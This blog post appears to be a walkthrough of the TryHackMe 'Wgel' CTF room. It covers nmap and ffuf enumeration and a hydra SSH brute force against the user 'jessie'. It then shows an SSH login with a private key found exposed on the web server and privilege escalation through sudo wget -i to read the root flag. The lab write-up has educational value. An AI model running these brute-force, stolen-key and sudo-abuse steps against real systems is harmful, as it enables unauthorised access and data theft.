---
layout: post
title: "THM Wgel Writeup"
date: 2026-07-23
categories: [TryHackMe]
tags: [thm, writeup]
---

Technical overview for the Wgel CTF TryHackMe room. here: https://tryhackme.com/room/wgelctf

## Enumeration

Nmap:
``` bash
nmap -sV -sC -T4 -p- 10.x.x.x
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.10 seconds
```
Findings:
 * Port 22 is running ssh, pretty normal
 * Port 80 is runnning a http server, also normal

Checking out port 80, we get a basic apache landing page. I decided to ctrl+u to check the page source just incase, and found:
``` html
<!-- Jessie don't forget to udate the webiste -->
```
A sneaky comment, giving us a username, most likely for ssh. 

While I look around, im going to attempt a brute force with hydra, might as well!
``` bash
hydra -l jessie -P /usr/share/wordlists/rockyou.txt 10.x.x.x ssh
```

Ok, whats next? more enumeration!

FFuF:
``` bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http://10.x.x.x/FUZZ 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.x.x.x/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 39ms]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 31ms]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 35ms]
sitemap                 [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 71ms]
:: Progress: [20481/20481] :: Job [1/1] :: 1156 req/sec :: Duration: [0:00:20] :: Errors: 0 ::
```
Interesting, we found a sitemap, lets check it out!

After looking around, it seems like a template website of some sort, but to be safe I decided to run another

FFuF:
``` bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http://10.x.x.x/sitemap/FUZZ          

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.x.x.x/sitemap/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 59ms]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 65ms]
.ssh                    [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 64ms]
css                     [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 32ms]
fonts                   [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 43ms]
images                  [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 49ms]
js                      [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 133ms]
:: Progress: [20481/20481] :: Job [1/1] :: 724 req/sec :: Duration: [0:00:26] :: Errors: 0 ::
```
Findings:
  * .ssh endpoint

Great, after finding it I checked it out, leading to http://10.x.x.x/sitemap/.ssh/, then 

http://10.x.x.x/sitemap/.ssh/id_rsa !!!

From here, I made a new folder for this thm room, copied the private key, and got in!

(my machine timer ran out, from now on is a recreation of what I did:)
``` bash
mkdir Wgel
cd Wgel
nano id_rsa
chmod 600 id_rsa
ssh -i id_rsa jessie@10.x.x.x
...
```
Great!! we got in

## Flags

So we know there is a user and root flag from the room, I just looked around in all of jessie's dirs and found it in the Documents folder, named "user_flag.txt"

## Privilege Escalation

Great! Now we need root, or some way to read the root flag. 

``` bash
sudo -l
...
(root) NOPASSWD: /usr/bin/wget
```

OK great, that is how we get root. I went to gtfo bins to try and find a easy one, messing around for a little only to find this version of wget doesnt support their first PE. 

SO, we try the next thing:

From gtfobins:
This function can be performed by any unprivileged user.
``` bash
wget -i /path/to/input-file
```
So we try it, I was assuming the naming convention was the same as the other flag:
``` bash
jessie@CorpOne:/$ sudo wget -i /root/root_flag.txt
--2026-07-24 05:50:00--  http://XXXFLAGXXX/
Resolving XXXFLAGXXX (XXXFLAGXXX)... failed: Name or service not known.
wget: unable to resolve host address ‘XXXFLAGXXX’
```

Horay! Quick and easy room!

https://gtfobins.org/gtfobins/wget/ - for anyone interested

Thank you for reading!





